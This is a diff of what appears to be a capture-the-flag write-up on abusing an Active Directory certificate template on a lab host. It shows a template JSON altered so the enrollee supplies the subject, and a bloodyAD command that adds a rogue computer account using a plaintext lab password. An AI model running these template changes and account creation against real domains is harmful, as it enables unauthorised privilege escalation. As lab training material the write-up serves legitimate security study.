@@ -1012,8 +1012,42 @@ After some research i find the attribute that controls the `Enrollee Supplies Su
 Now ill modify the attribute to `"msPKI-Certificate-Name-Flag": 402653185` this sets the `Enrollee Supplie Subject` to true
 
 ```python
+❯❯❯ cat Machine.json 
+{
+  "showInAdvancedViewOnly": true,
+  "nTSecurityDescriptor": "HEX:0100049c2001000000000000000000001400000004000c010600000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0002000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0302000005003800300100000100000068c9100efb78d21190d400c04f79dc550105000000000005150000009dc3769ba40e31d2fcd42b5c0702000000002400ff000f000105000000000005150000009dc3769ba40e31d2fcd42b5c0002000000002400ff000f000105000000000005150000009dc3769ba40e31d2fcd42b5c07020000000014009400020001010000000000050b0000000105000000000005150000009dc3769ba40e31d2fcd42b5c07020000",
+  "flags": 66144,
+  "pKIDefaultKeySpec": 1,
+  "pKIKeyUsage": "HEX:a000",
+  "pKIMaxIssuingDepth": 0,
+  "pKICriticalExtensions": [
+    "2.5.29.15"
+  ],
+  "pKIExpirationPeriod": 31536000,
+  "pKIOverlapPeriod": 3628800,
+  "pKIExtendedKeyUsage": [
+    "1.3.6.1.5.5.7.3.2",
+    "1.3.6.1.5.5.7.3.1"
+  ],
+  "pKIDefaultCSPs": [
+    "1,Microsoft RSA SChannel Cryptographic Provider"
+  ],
+  "msPKI-RA-Signature": 0,
+  "msPKI-Enrollment-Flag": 32,
+  "msPKI-Private-Key-Flag": 0,
+  "msPKI-Certificate-Name-Flag": 402653185,
+  "msPKI-Minimal-Key-Size": 2048
+}
+```
+
+
+```python
 ❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u s.blade -p 'AmcwNO60Zg3vca3o0HDrTC6D' add computer 'evil' 'Password123!' --ou 'OU=BuildAgents,OU=Development,DC=coder,DC=htb' 
 [+] evil$ created
 ```
 
-Now since the machine template only allowed domain com
+Now since the machine template only allowed domain computers to enroll in the template ill use `s.blade` permission to add a computer to that OU
+
+```python
+
+```
